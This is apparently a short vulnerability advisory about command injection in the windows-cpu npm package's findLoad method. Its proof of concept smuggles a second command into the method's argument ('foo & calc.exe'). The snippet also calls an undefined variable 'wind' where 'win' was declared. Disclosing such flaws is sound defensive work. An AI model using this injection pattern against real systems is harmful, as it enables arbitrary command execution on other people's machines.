# Overview

`windows-cpu`is a CPU monitoring utility for windows, this package are vulnerable to Arbitrary Command Execution via the findLoad method, which passes a user-inputed string to the shell without validation.

# Proof of Concept

```
var win = require('windows-cpu');
wind.findLoad('foo & calc.exe');
```
